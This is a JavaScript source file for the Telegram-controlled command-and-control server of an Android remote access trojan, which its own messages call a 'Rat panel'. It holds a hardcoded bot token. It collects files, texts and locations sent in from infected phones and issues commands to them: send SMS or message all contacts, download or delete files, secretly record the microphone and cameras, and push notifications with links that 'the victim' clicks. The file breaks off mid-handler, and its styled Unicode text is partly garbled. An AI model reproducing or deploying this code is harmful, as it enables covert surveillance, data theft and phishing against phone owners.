const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '5376895931:AAGungqejutol8QIidI2tlJMkmCSUuAAY9w'
const id = '1209615263'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `° 1�7 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `° 1�7 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `° 1�7 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `° 1�7 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
        ` 1�7 ᴅᴇᴠɪᴄᴄ1�7 ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        ` 1�7 ʙᴄ1�7ᴛᴛᴇʄ1�7ʏ : <b>${battery}</b>\n` +
        ` 1�7 ᴄ1�7ɴᴅʄ1�7ᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        ` 1�7 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        ` 1�7 ᴘʄ1�7ᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `° 1�7 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
            ` 1�7 ᴅᴇᴠɪᴄᴄ1�7 ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            ` 1�7 ʙᴄ1�7ᴛᴛᴇʄ1�7ʏ : <b>${battery}</b>\n` +
            ` 1�7 ᴄ1�7ɴᴅʄ1�7ᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            ` 1�7 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            ` 1�7 ᴘʄ1�7ᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('° 1�7 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '° 1�7 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
                ' 1�7 ʙᴄ1�7 ᴄᴀʀᴇꜰᴜʄ1�7 ᴛʜᴀᴄ1�7 ᴛʜᴇ ᴍᴇꜱꜱᴄ1�7ɢᴄ1�7 ᴡɪʟʄ1�7 ɴᴏᴛ ʙᴄ1�7 ꜱᴇɴᴄ1�7 ɪ꜄1�7 ᴛʜᴇ ɴᴜᴍʙᴇʄ1�7 ᴏꜰ ᴄʜᴀʀᴄ1�7ᴄᴛᴇʄ1�7꜄1�7 ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴄ1�7ɢᴄ1�7 ɪ꜄1�7 ᴍᴏʀᴄ1�7 ᴛʜᴀɴ ᴄ1�7ʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('° 1�7 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '° 1�7 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
                ' 1�7 ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɄ1�7 ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴄ1�7ᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴄ1�7 ʏᴏᴜ ᴄ1�7ʀᴄ1�7 ᴇɴᴛᴇʄ1�7ɪɴɢ ᴡɪʟʄ1�7 ʙᴄ1�7 ᴏᴘᴇɴᴇᴄ1�7',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('° 1�7 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('° 1�7 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '° 1�7 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                ' 1�7 ʏᴏᴜ ᴡɪʟʄ1�7 ʀᴇᴄᴇɪᴠᴄ1�7 ᴄ1�7 ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴄ1�7 ꜰᴇᴄ1�7 ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '° 1�7 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n' +
                ' 1�7 ɪ꜄1�7 ᴛʜᴇ ᴄ1�7ᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪ꜄1�7 ɪɴꜱᴛᴄ1�7ʟʟᴇᴅ ᴏɄ1�7 ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴄ1�7, ᴡᴀɪᴄ1�7 ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
                ' 1�7 ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴄ1�7 ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴄ1�7ɢᴄ1�7, ɪᴄ1�7 ᴍᴇᴄ1�7ɴ꜄1�7 ᴛʜᴀᴄ1�7 ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴄ1�7 ɪ꜄1�7 ᴄᴏɴɴᴇᴄᴛᴇᴄ1�7 ᴄ1�7ɴᴄ1�7 ʀᴇᴀᴅʄ1�7 ᴛᴏ ʀᴇᴄᴇɪᴠᴄ1�7 ᴛʜᴇ ᴄᴏᴍᴍᴄ1�7ɴᴅ\n\n' +
                ' 1�7 ᴄʟɪᴄᴄ1�7 ᴏɄ1�7 ᴛʜᴇ ᴄᴏᴍᴍᴄ1�7ɴᴄ1�7 ʙᴜᴛᴛᴏɴ ᴄ1�7ɴᴄ1�7 ꜱᴇʟᴇᴄᴄ1�7 ᴛʜᴇ ᴅᴇꜱɪʄ1�7ᴇᴅ ᴅᴇᴠɪᴄᴄ1�7 ᴛʜᴇɴ ꜱᴇʟᴇᴄᴄ1�7 ᴛʜᴇ ᴅᴇꜱɪʄ1�7ᴇᴅ ᴄᴏᴍᴍᴄ1�7ɴᴄ1�7 ᴄ1�7ᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴄ1�7ɴᴅꜱ\n\n' +
                ' 1�7 ɪ꜄1�7 ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴄ1�7 ꜱᴏᴍᴇᴡʜᴇʀᴄ1�7 ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴄ1�7 /start ᴄᴏᴍᴍᴄ1�7ɴᴄ1�7',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '° 1�7 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    ' 1�7 ᴍᴀᴋᴇ ꜱᴜʀᴄ1�7 ᴛʜᴇ ᴄ1�7ᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪ꜄1�7 ɪɴꜱᴛᴄ1�7ʟʟᴇᴅ ᴏɄ1�7 ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴄ1�7'
                )
            } else {
                let text = '° 1�7 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += ` 1�7 ᴅᴇᴠɪᴄᴄ1�7 ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        ` 1�7 ʙᴄ1�7ᴛᴛᴇʄ1�7ʏ : <b>${value.battery}</b>\n` +
                        ` 1�7 ᴄ1�7ɴᴅʄ1�7ᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        ` 1�7 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        ` 1�7 ᴘʄ1�7ᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '° 1�7 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    ' 1�7 ᴍᴀᴋᴇ ꜱᴜʀᴄ1�7 ᴛʜᴇ ᴄ1�7ᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪ꜄1�7 ɪɴꜱᴛᴄ1�7ʟʟᴇᴅ ᴏɄ1�7 ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴄ1�7'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '° 1�7 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '° 1�7 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`° 1�7 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}`},
